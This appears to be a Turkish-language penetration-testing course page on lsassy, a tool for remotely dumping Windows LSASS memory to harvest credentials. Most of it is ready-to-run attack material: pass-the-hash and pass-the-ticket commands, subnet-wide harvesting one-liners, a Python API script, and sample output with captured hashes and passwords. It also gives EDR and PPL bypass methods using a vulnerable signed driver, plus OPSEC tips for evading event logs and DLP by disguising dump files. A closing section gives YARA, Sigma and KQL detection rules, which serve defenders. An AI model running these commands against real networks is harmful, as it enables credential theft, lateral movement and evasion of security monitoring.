# lsassy

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Uzak Windows sistemleri üzerinde etkileşimli kabuk açmadan veya diske Mimikatz ikilisi bırakmadan; SMB, WMI veya Görev Zamanlayıcı aracılığıyla yerel Windows mekanizmalarıyla (comsvcs, procdump, nanodump vb.) LSASS bellek dökümünü tetikleyen ve dökümü SMB akışı üzerinden pypykatz ile uzaktan çözümleyen açık kaynaklı kimlik hasat motoru.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde yanal hareket (Lateral Movement) ve etki alanı hakimiyeti aşamalarında hedef sistemlerdeki bellek içi kimlik bilgilerini (NTLM hash'leri, Kerberos biletleri, açık metin parolalar) çekmek en kritik hedeflerden biridir. Ancak hedef makinelerde doğrudan `mimikatz.exe` gibi bilinen zararlı ikilileri diske yazmak veya etkileşimli PowerShell oturumlarında bellek kancalamak modern EDR sistemleri tarafından anında engellenir ve engelleme alarmları üretir.

**`lsassy`** (Romain Bentz / @Hackndo tarafından geliştirilen), bu sorunu çözmek için uzaktan yönetim protokollerini (SMB, RPC, WMI) ve Windows'un kendi yerel kütüphanelerini (*Living-off-the-Land - LOLBins*) birleştiren modüler bir araçtır. Aracın temel çalışma prensibi şu aşamalardan oluşur:

1. **Uzak Yürütme Tetiklemesi (Remote Execution):** Saldırgan makineden hedef ana bilgisayara SMB (Servis oluşturma), WMI veya Zamanlanmış Görev (Scheduled Task) üzerinden bir komut gönderilir.
2. **Yerel Bellek Dökümü Alma (In-situ Dumping):** Hedef makinede üçüncü taraf bir araç çalıştırmak yerine Windows'un yerel `comsvcs.dll` kütüphanesi (`MiniDump` fonksiyonu), `procdump`, `dumpert` veya `nanodump` kullanılarak `lsass.exe` sürecinin minidump dosyası geçici bir dizine (`C:\Windows\Temp\`) yazdırılır.
3. **SMB Akışı ile Uzaktan Ayrıştırma (Remote Streaming Parsing):** `lsassy`, hedefteki 50–100 MB boyutundaki devasa `.dmp` dosyasını saldırgan makineye indirmez. Bunun yerine `pypykatz` kütüphanesinin SMB taşıma katmanını (`SMBTransport`) kullanarak yalnızca kimlik bilgilerini barındıran bellek yapılarını (LogonSessionList, Security Packages) SMB üzerinden bayt bayt uzaktan okur.
4. **Otomatik Temizlik (Automated Cleanup):** Kimlik bilgileri çekildiği anda hedefteki minidump dosyası SMB üzerinden derhal silinir ve arkada dosya kalıntısı bırakılmaz.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                      SALDIRGAN MAKİNESİ (LINUX)                        │
│                                                                        │
│  [ lsassy CLI / NetExec ] ──(1) Yetkili SMB/WMI Oturumu ──────────────┐ │
│         ▲                                                             │ │
│         │ (4) SMB Akışı Üzerinden Bayt Okuma (pypykatz SMBTransport)   │ │
│         │     [ Yalnızca Gerekli LSA Bellek Ofsetleri Çekilir ]        │ │
│         │                                                             │ │
│         └───(5) Otomatik Silme Talebi (SMB DeleteFile) ───────────────┼─┘
└───────────────────────────────────────────────────────────────────────┼──
                                                                        │
                                   SMB (TCP 445) / WMI (TCP 135)        │
                                                                        ▼
┌────────────────────────────────────────────────────────────────────────┐
│                      HEDEF WINDOWS SUNUCU / İSTEMCİ                    │
│                                                                        │
│  (2) Uzak Yürütme: rundll32.exe C:\Windows\System32\comsvcs.dll #24    │
│                    <LSASS_PID> C:\Windows\Temp\tmp_dmp.dmp full        │
│                                                                        │
│  (3) [ lsass.exe ] ── MiniDumpWriteDump ──> [ C:\Windows\Temp\tmp.dmp ]│
│                                                          │             │
│                                                          ▼             │
│                                              (4) Döküm Akışı Okunur    │
│                                              (5) Dosya Diskten Silinir │
└────────────────────────────────────────────────────────────────────────┘
```

### 1.1 `pypykatz` SMBTransport Akış Mimarisi (Bandwidth Optimization)

Geleneksel yöntemlerde uzak sistemden alınan bir minidump dosyası (genellikle 50 MB ile 150 MB arası) SCP, SMB veya HTTP ile tamamen saldırgan makinesine indirilir. Yüzlerce makinenin bulunduğu kurumsal bir ağda bu durum hem gigabaytlarca şüpheli ağ trafiğine (Network Anomaly) yol açar hem de saatler sürer.

`lsassy`, `pypykatz` kütüphanesinin **`SMBTransport`** arabirimini entegre ederek bu darboğazı ortadan kaldırır:
- Minidump dosya formatı bir dizin yapısı (Stream Directory) içerir.
- `lsassy` SMB üzerinden dosyanın yalnızca ilk birkaç kilobaytını okuyarak döküm başlığını ve akış dizinini çözümler.
- Ardından yalnızca güvenlik paketlerinin (`msv1_0.dll`, `kerberos.dll`) haritalandığı sanal bellek sayfalarını arar.
- Yalnızca `LogonSessionList` işaretçilerinin gösterdiği bellek ofsetlerine karşılık gelen baytları SMB `SMB2_READ` istekleriyle çeker.
- **Sonuç:** 100 MB'lık döküm dosyasının tamamı yerine ağ üzerinden yalnızca **1.5 MB ile 3 MB** arasında veri aktarılır ve analiz 2-3 saniye içinde tamamlanır.

### 1.2 Yürütme ve Döküm Yöntem Matrisi

| Yürütme Yöntemi (`-x`) | Kullanılan Protokol / Port | Windows Olay Günlüğü | Tespit Hassasiyeti |
|---|---|---|---|
| **`smb` (Varsayılan)** | SMB / TCP 445 (Service Control Manager) | Event ID 7045 (Yeni Servis) | Yüksek (Servis kurulumu izlenir) |
| **`wmi`** | RPC / TCP 135 + Dinamik Portlar | Event ID 4688 / WmiPrvSE | Orta (Meşru yönetim trafiği) |
| **`task`** | RPC / Task Scheduler (TCP 135/445) | Event ID 4698 / 4702 | Düşük - Orta |
| **`mmc`** | DCOM MMC20.Application (TCP 135) | Event ID 4688 / mmc.exe | Düşük |

---

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Etkileşimsiz ve Kabuksuz** | Hedef üzerinde interaktif oturum (CMD, PowerShell) açmaya gerek duymaz. | Uzaktan erişim izlerini en aza indirir; uç noktada kullanıcı farkındalığını önler. |
| **Ağ Bant Genişliği Tasarrufu**| Tüm minidump dosyasını indirmez; yalnızca ayrıştırma için gereken ofsetleri akıtır. | Ağ trafiğinde onlarca megabaytlık anomali oluşturmaz; işlem saniyeler içinde biter. |
| **Modüler Döküm Yöntemleri** | `comsvcs`, `procdump`, `dumpert`, `nanodump`, `edrsandblast` yöntemlerini destekler. | Bir yöntem EDR tarafından engellendiğinde tek bayrakla alternatif yönteme geçilir. |
| **Farklı Yürütme Motorları** | Yürütmeyi `smb` (Servis), `wmi`, `task` (Zamanlanmış Görev) veya `mmc` ile yapabilir. | Windows Event ID 7045 (Servis kurulumu) izleme kurallarını WMI veya Task ile baypas eder. |
| **NetExec / CME Entegrasyonu** | NetExec ve CrackMapExec araçlarına doğrudan modül (`-M lsassy`) olarak entegredir. | Yüzlerce makinelik alt ağlarda tek komutla toplu kimlik hasadı yapılmasını sağlar. |

### Karşılaştırma Tablosu

| Kriter | lsassy | impacket-secretsdump | NetExec (-M lsassy) | Mimikatz (Canlı) |
|---|---|---|---|---|
| **Veri Kaynağı** | LSASS Belleği (RAM) | SAM / NTDS.dit / LSA | LSASS Belleği (RAM) | LSASS Belleği (RAM) |
| **Hedefe İkili Bırakma** | Hayır (LOLBin kullanır) | Hayır (DRSR / SAMR) | Hayır (lsassy motoru) | Evet (`mimikatz.exe` diske/RAM'e) |
| **Aktif Oturum Parolaları**| Çeker (Açık metin / bilet) | Hayır (Yalnızca hash) | Çeker (Açık metin / bilet) | Çeker (Canlı bellek) |
| **Ağ Protokolü** | SMB + WMI/RPC | SMB + RPC (DRSR) | SMB + WMI/RPC | Yerel API / SMB (DCSync) |
| **EDR Yakalanma Riski** | Düşük - Orta | Düşük (DCSync hariç) | Düşük - Orta | Çok Yüksek |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
lsassy [kimlik_doğrulama] [seçenekler] <hedef_veya_cidr>
```

### Kritik Parametre Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-u`, `--username` | Kimlik doğrulama için kullanılacak kullanıcı adı. | `-u Administrator` |
| `-p`, `--password` | Kullanıcının açık metin parolası. | `-p 'P@ssw0rd2026!'` |
| `-H`, `--hash` | Pass-the-Hash için kullanılacak NTLM hash (LM:NTLM veya :NTLM). | `-H :01fc5a6be7bc6929c40372d23f5052b3` |
| `-d`, `--domain` | Etki alanı adı (Local hesaplar için boş bırakılır). | `-d corp.local` |
| `-k`, `--kerberos` | Kerberos kimlik doğrulaması kullan (`KRB5CCNAME` biletini okur). | `-k -no-pass` |
| `--aesKey` | Kerberos kimlik doğrulamasında kullanılacak AES256/128 anahtarı. | `--aesKey 1673a9f0...` |
| `-m`, `--method` | LSASS bellek dökümünü almak için kullanılacak yöntem. | `-m comsvcs` / `-m nanodump` |
| `-x`, `--exec-method`| Hedefte komut yürütmek için kullanılacak protokol/mekanizma. | `-x wmi` / `-x task` / `-x smb` |
| `--dumppath` | Dökümün hedefte geçici yazılacağı dosya yolu. | `--dumppath C:\Windows\Temp\` |
| `--dumpname` | Geçici döküm dosyasının adı. | `--dumpname backup.tmp` |
| `-o`, `--format` | Çıktı formatı (`raw`, `json`, `grep`). | `-o json` |
| `--timeout` | SMB/RPC komut yürütme zaman aşımı süresi (saniye). | `--timeout 45` |
| `-v`, `-vv` | Detaylı hata ayıklama ve çıktı modu (Verbose). | `-vv` |

### Desteklenen Döküm Yöntemleri (`-m`)

- **`comsvcs` (Varsayılan):** `rundll32.exe comsvcs.dll MiniDump` çağrısını kullanarak Windows'un yerel hata raporlama motorunu tetikler.
- **`procdump`:** Hedefe Sysinternals `procdump.exe` aracını yükleyip döküm alır ve işlem bitince siler.
- **`dumpert`:** Outflank Dumpert doğrudan sistem çağrıları (Direct Syscalls) motorunu kullanarak EDR kancalarını baypas eder.
- **`nanodump`:** Minimal boyutlu ve şifreli döküm üreten BOF/ikili motoru.
- **`edrsandblast`:** Savunmasız imzalı sürücü (BYOVD) yükleyerek EDR ve PPL korumalarını çekirdek seviyesinde kaldırıp döküm alır.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Standart SMB Kimlik Doğrulaması ile Tekil Hedef Analizi

Hedef makinede yönetici haklarına sahip bir hesapla standart `comsvcs` yöntemi kullanılarak LSASS bellek dökümü alınır ve kimlikler ekrana dökülür.

```bash
lsassy -d corp.local -u AdminUser -p 'Summer2026!' 192.168.1.50
```

**Konsol Çıktısı Analizi:**

```text
[+] [192.168.1.50] Connecting to host
[+] [192.168.1.50] Authenticated as corp.local\AdminUser
[+] [192.168.1.50] Searching for LSASS PID...
[+] [192.168.1.50] LSASS PID found: 648
[+] [192.168.1.50] Dumping LSASS using method 'comsvcs'
[+] [192.168.1.50] Executing command via WMI: rundll32.exe C:\Windows\System32\comsvcs.dll #24 648 C:\Windows\Temp\48f9b1.tmp full
[+] [192.168.1.50] LSASS dumped successfully
[+] [192.168.1.50] Parsing dump file remotely via SMB
[+] [192.168.1.50] Deleting C:\Windows\Temp\48f9b1.tmp
[+] [192.168.1.50] Credentials found:
  CORP\Administrator : 01fc5a6be7bc6929c40372d23f5052b3 (NTLM)
  CORP\svc_backup    : BackupMaster2026! (Plaintext - WDigest)
  CORP\jdoe          : 8846f7eaee8fb117ad06bdd830b7586c (NTLM)
```

---

### Senaryo 2: Pass-the-Hash ile Tüm Bir Alt Ağda (CIDR) Otomatik Hasat

Ele geçirilen bir NTLM hash'i kullanılarak `192.168.1.0/24` bloğundaki tüm sistemlerde paralel olarak oturum açılır ve bellekteki tüm kullanıcı bilgileri toplanır.

```bash
lsassy -d corp.local -u Administrator -H :01fc5a6be7bc6929c40372d23f5052b3 192.168.1.0/24 -o json > domain_hashes.json
```

---

### Senaryo 3: Kerberos Kimlik Doğrulaması (Pass-the-Ticket) ile DC Dökümü

Önceden elde edilmiş geçerli bir TGT bileti (`.ccache`) ortam değişkenine aktarılır; parola veya hash belirtmeden doğrudan Kerberos kimlik doğrulaması ile hedef sorgulanır.

```bash
export KRB5CCNAME=/tmp/admin_ticket.ccache
lsassy -k -no-pass -d corp.local dc01.corp.local
```

---

### Senaryo 4: EDR Atlatma Odaklı Yürütme (WMI + Nanodump Metodu)

Windows Servis Oluşturma (Event ID 7045) izini engellemek için `-x wmi` yürütme motoru seçilir; `comsvcs.dll` imzasından kaçınmak için ise döküm motoru `-m nanodump` olarak belirlenir.

```bash
lsassy -d corp.local -u AdminUser -p 'P@ssw0rd!' -x wmi -m nanodump --dumpname debug_cache.dat 192.168.1.50
```

---

### Senaryo 5: BYOVD Tabanlı edrsandblast Yöntemi ile PPL Korumasını Aşma

Hedefte `RunAsPPL` (Protected Process Light) devredeyse, savunmasız imzalı sürücü yükleyerek LSASS korumasını çekirdek seviyesinde kaldıran `edrsandblast` yöntemi kullanılır:

```bash
lsassy -d corp.local -u AdminUser -p 'P@ssw0rd!' -m edrsandblast 192.168.1.50
```

---

### Senaryo 6: NetExec (NXC) Üzerinden Modüler ve Toplu Kullanım

NetExec sızma testi çerçevesi üzerinden tüm etki alanı iş istasyonlarında tek satırla LSASS hasadı gerçekleştirilir.

```bash
netexec smb 192.168.1.0/24 -u Administrator -H 01fc5a6be7bc6929c40372d23f5052b3 -M lsassy
```

---

### Senaryo 7: Python Betiği İçinde lsassy API Entegrasyonu

Özel sızma testi otomasyonlarında doğrudan Python kodu içerisinden `lsassy` modülünü çağırarak kimlikleri ayrıştırma:

```python
from lsassy.core import LSASSY
from lsassy.session import Session

session = Session(
    target="192.168.1.50",
    domain="corp.local",
    username="AdminUser",
    password="Password123!",
    method="nanodump",
    exec_method="wmi"
)
ls = LSASSY(session)
credentials = ls.run()
for cred in credentials:
    print(f"User: {cred.username} | Hash: {cred.ntlm} | Pass: {cred.password}")
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `STATUS_ACCESS_DENIED (0xc0000022)` | Kullanıcının hedef makinede yerel yönetici hakkı yok veya UAC Remote Restriction devrede. | Yerel hesaplarda `LocalAccountTokenFilterPolicy` kayıt defteri değerini `1` yapın veya Etki Alanı Yöneticisi hesabı kullanın. |
| `Failed to dump LSASS: PPL is enabled` | Hedefte LSA Protection (`RunAsPPL`) aktif; `comsvcs` veya standart API'ler engelleniyor. | BYOVD tabanlı `-m edrsandblast` yöntemini kullanın veya çekirdek sürücüsü yükleyerek PPL korumasını kaldırın. |
| `RPC_S_SERVER_UNAVAILABLE (0x000006ba)` | Hedef sistemdeki Windows Güvenlik Duvarı Port 135 veya RPC dinamik portlarını engelliyor. | `-x smb` parametresini kullanarak yürütmeyi doğrudan Port 445 üzerinden Servis Yöneticisi ile gerçekleştirin. |
| `STATUS_LOGON_FAILURE (0xc000006d)` | Girilen parola veya NTLM hash hatalı; ya da hesap kilitli / devre dışı. | Kimlik bilgilerini `netexec smb <hedef> -u ... -p ...` ile doğrulayın; hesap kilitlenme politikasını kontrol edin. |
| `Failed to parse dump: incomplete stream` | Ağ gecikmesi veya hedef sistemin döküm tamamlanmadan bağlantıyı kesmesi. | `--timeout 60` parametresi ile zaman aşımı süresini artırın veya döküm yolunu yerel hızlı bir diske yönlendirin. |
| `WMI query timeout / Access Denied` | WMI servisi yanıt vermiyor veya DCOM erişim izinleri kısıtlanmış. | `-x task` (Scheduled Task) yürütme yöntemine geçin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ: ORTA - YÜKSEK (KULLANILAN YÖNTEME BAĞLI)
──────────────────────────────────────────────────────────────────
[ Windows Logları ] : Event ID 4624 (Logon Type 3), Event ID 7045 (Servis)
[ Sysmon ]          : Event ID 1 (rundll32.exe comsvcs #24), Event ID 11 (Dmp)
[ Ağ İmzaları ]     : SMB Named Pipe Erişimi, C$\Windows\Temp Yazma/Silme
[ EDR Davranışı ]   : comsvcs.dll ile LSASS Handle Açma Girişimi
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

1. **Windows Security Event ID 4624 (Logon Type 3 - Network):**
   - Saldırgan makinesinden hedef makinenin SMB servisine (Port 445) yetkili ağ oturumu açılır.
2. **Windows System Event ID 7045 (A new service was installed):**
   - Varsayılan `-x smb` modu kullanıldığında hedefte geçici bir Windows Servisi (`lsassy_svc` vb.) oluşturulur ve döküm komutunu çalıştırır. WMI (`-x wmi`) veya Task (`-x task`) modunda bu log oluşmaz.
3. **Sysmon Event ID 1 (Process Creation):**
   - `comsvcs` yöntemi kullanıldığında komut satırında şu imza net olarak görülür:
     `rundll32.exe C:\Windows\System32\comsvcs.dll #24 <PID> C:\Windows\Temp\<random>.tmp full`
4. **Sysmon Event ID 11 (FileCreate):**
   - `C:\Windows\Temp\` veya `C$\` paylaşımı altında `.tmp` veya `.dmp` uzantılı dosya oluşturulması ve hemen ardından silinmesi.

### 5.2 Ağ ve EDR İmzaları

- **SMB Trafik Anomalisi:** `lsassy`, minidump dosyasının tamamını indirmese de, SMB üzerinden dosya başlıklarını ve ofsetlerini okumak için hızlı `SMB2_READ` istekleri üretir.
- **EDR Sezgisel Alarmları:** Modern EDR'lar (Defender for Endpoint, SentinelOne), `rundll32.exe` sürecinin `comsvcs.dll` içerisindeki ordinal 24 (`MiniDump`) fonksiyonunu çağırmasını statik kural olarak doğrudan engeller.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | Hedefte LSASS bellek dökümünü alma ve çözümleme. |
| **T1021.002** | Remote Services: SMB/Windows Admin Shares | SMB paylaşımları üzerinden döküm dosyasını okuma ve silme. |
| **T1047** | Windows Management Instrumentation (WMI) | `-x wmi` ile hedefte kod yürütme. |
| **T1053.005** | Scheduled Task/Job: Scheduled Task | `-x task` ile hedefte zamanlanmış görev tetikleme. |
| **T1070.004** | Indicator Removal: File Deletion | Döküm alındıktan sonra `.tmp` dosyasının otomatik silinmesi. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Servis Kurulumu (Event 7045)** | `-x smb` yerine her zaman `-x wmi` veya `-x task` yürütme motorunu tercih edin. |
| **comsvcs İmzası** | EDR bulunan ortamlarda `-m comsvcs` kullanmayın. `-m nanodump` veya `-m dumpert` yöntemlerine geçin. |
| **Geçici Dosya İmzası** | Varsayılan dosya adı ve yolunu `--dumppath C:\Users\Public\ --dumpname app_log.dat` şeklinde zararsız görünen isimlerle maskeleyin. |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma & YARA)

**YARA Kuralı — Ağ Üzerinde lsassy Betiği veya Çıktı Kalıbı Tespiti:**

```yara
rule Suspicious_LSASSY_Tool_Signature {
    meta:
        description = "Detects lsassy python package references and specific dump parameters"
        author = "Active Directory Security Project"
        date = "2026-10-14"
        severity = "High"
    strings:
        $p1 = "lsassy.core"
        $p2 = "lsassy.session"
        $p3 = "Dumping LSASS using method"
        $p4 = "Parsing dump file remotely via SMB"
    condition:
        2 of them
}
```

**Sigma Kuralı — comsvcs.dll ile LSASS Dökümü Alma Tespiti:**

```yaml
title: LSASS Dump via Comsvcs DLL
status: experimental
description: Detects process dumping execution using rundll32 calling comsvcs.dll MiniDump export.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: '\rundll32.exe'
    CommandLine|contains|all:
      - 'comsvcs'
      - 'full'
  condition: selection
level: critical
```

**Microsoft Sentinel (KQL) — Şüpheli comsvcs Çağrısı:**

```kql
DeviceProcessEvents
| where ProcessCommandLine has "comsvcs"
| where ProcessCommandLine has_any ("MiniDump", "#24")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart SMB Üzerinden Hızlı Kimlik Dökümü
```bash
lsassy -d corp.local -u Administrator -p 'Password123!' 192.168.1.50
```
- **Ne Yapar?** Hedef makineye SMB ile bağlanır, `comsvcs` ile LSASS dökümünü alır, kimlikleri ekrana yazar ve dökümü siler.
- **Ne Zaman Kullanılır?** Yerel veya etki alanı yönetici hakları elde edilen tek bir makineden hızlıca kimlik toplamak için.
- **Parametreler:** `-d`: Etki alanı, `-u`: Kullanıcı, `-p`: Parola, `192.168.1.50`: Hedef IP.

### Komut 2: Pass-the-Hash ile Parolasız Döküm Alma
```bash
lsassy -d corp.local -u Admin -H :01fc5a6be7bc6929c40372d23f5052b3 192.168.1.50
```
- **Ne Yapar?** Parola girmeden doğrudan NTLM hash'i ile oturum açarak döküm alma sürecini işletir.
- **Ne Zaman Kullanılır?** Açık metin parola bilinmediğinde, yalnızca hash ele geçirildiğinde yanal hareket için.
- **Parametreler:** `-H`: Hedef kullanıcının NTLM hash değeri.

### Komut 3: WMI Yürütme Motoru ile Servis İzini Engelleme
```bash
lsassy -d corp.local -u Admin -p 'Pass!' -x wmi 192.168.1.50
```
- **Ne Yapar?** Komut yürütme mekanizması olarak Windows Servis Yöneticisi yerine WMI protokolünü kullanır.
- **Ne Zaman Kullanılır?** Hedefte Event ID 7045 (Servis kurulumu) logunu tetiklememek ve SIEM dedektörlerini aşmak için.
- **Parametreler:** `-x wmi`: WMI yürütme motoru.

### Komut 4: Nanodump Yöntemi ile EDR Korumalı Ortamda Döküm
```bash
lsassy -d corp.local -u Admin -p 'Pass!' -m nanodump 192.168.1.50
```
- **Ne Yapar?** Yerel `comsvcs.dll` yerine bellek içi API kancasızlaştırma yapan `nanodump` motorunu kullanır.
- **Ne Zaman Kullanılır?** Hedefte `comsvcs` imzasını yakalayan katı bir EDR devrede olduğunda.
- **Parametreler:** `-m nanodump`: Nanodump bellek döküm yöntemi.

### Komut 5: Tüm Alt Ağda CIDR Taraması ve Hasat
```bash
lsassy -d corp.local -u Admin -p 'Pass!' 192.168.1.0/24
```
- **Ne Yapar?** Belirtilen C sınıfı ağdaki tüm aktif IP'leri sırayla tarar ve yönetici haklarına sahip olduğu makinelerden kimlikleri toplar.
- **Ne Zaman Kullanılır?** Etki alanı genelinde yanal hareket için geniş çaplı kimlik haritalaması yaparken.
- **Parametreler:** `192.168.1.0/24`: Hedef CIDR IP bloğu.

### Komut 6: Kerberos Bileti ile Parolasız Oturum (Pass-the-Ticket)
```bash
KRB5CCNAME=/tmp/ticket.ccache lsassy -k -no-pass -d corp.local dc01.corp.local
```
- **Ne Yapar?** Önceden çalınan TGT biletini kullanarak Kerberos kimlik doğrulaması ile hedefte işlem yapar.
- **Ne Zaman Kullanılır?** NTLM trafiğinin yasaklandığı katı Kerberos ortamlarında veya Golden Ticket kullanırken.
- **Parametreler:** `-k`: Kerberos kullan, `-no-pass`: Parola sorma.

### Komut 7: JSON Formatında Çıktı Alma ve Dosyaya Kaydetme
```bash
lsassy -d corp.local -u Admin -p 'Pass!' 192.168.1.50 -o json > /tmp/creds.json
```
- **Ne Yapar?** Çıkarılan kimlik bilgilerini yapılandırılmış JSON formatında çıktılar.
- **Ne Zaman Kullanılır?** Elde edilen verileri otomatik komut dosyalarına veya veri tabanlarına aktarırken.
- **Parametreler:** `-o json`: JSON çıktı formatı.

### Komut 8: Geçici Dosya Adı ve Yolunu Maskeleme (OPSEC)
```bash
lsassy -d corp.local -u Admin -p 'Pass!' --dumppath 'C:\Users\Public\' --dumpname 'update_log.dat' 192.168.1.50
```
- **Ne Yapar?** Döküm dosyasını varsayılan `C:\Windows\Temp` yerine belirtilen dizine ve zararsız görünen isimle kaydeder.
- **Ne Zaman Kullanılır?** Dosya sistemi izleme ve DLP kurallarını atlatmak için.
- **Parametreler:** `--dumppath`: Hedef klasör, `--dumpname`: Dosya adı.

### Komut 9: Zamanlanmış Görev (Task) Yürütme Modu ile İşlem Yapma
```bash
lsassy -d corp.local -u Admin -p 'Pass!' -x task 192.168.1.50
```
- **Ne Yapar?** Servis veya WMI yerine Windows Task Scheduler üzerinden geçici zamanlanmış görev oluşturup tetikler.
- **Ne Zaman Kullanılır?** WMI trafiğinin engellendiği veya port kısıtlamalı sistemlerde alternatif yürütme için.
- **Parametreler:** `-x task`: Zamanlanmış görev yürütme motoru.

### Komut 10: BYOVDRTCore Sürücüsü ile PPL Baypası (edrsandblast Metodu)
```bash
lsassy -d corp.local -u Admin -p 'Pass!' -m edrsandblast 192.168.1.50
```
- **Ne Yapar?** Savunmasız imzalı RTCore64.sys sürücüsünü kullanarak çekirdekte LSASS PPL bitini sıfırlar ve döküm alır.
- **Ne Zaman Kullanılır?** Windows 11 veya Server 2022 üzerinde RunAsPPL koruması devredeyken.
- **Parametreler:** `-m edrsandblast`: BYOVD çekirdek döküm yöntemi.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Hackndo / lsassy](https://github.com/Hackndo/lsassy)
- **Hackndo Blog:** [Remote LSASS Dumping without Mimikatz](https://en.hackndo.com/remote-lsass-dump-passwords/)
- **MITRE ATT&CK Referansı:** [T1003.001 - OS Credential Dumping: LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **NetExec Entegrasyonu:** [NetExec lsassy Module Documentation](https://www.netexec.wiki/)

---

> **Önceki:** [← Dumpert](./Dumpert.md) · **Sonraki:** [SafetyKatz →](./SafetyKatz.md)
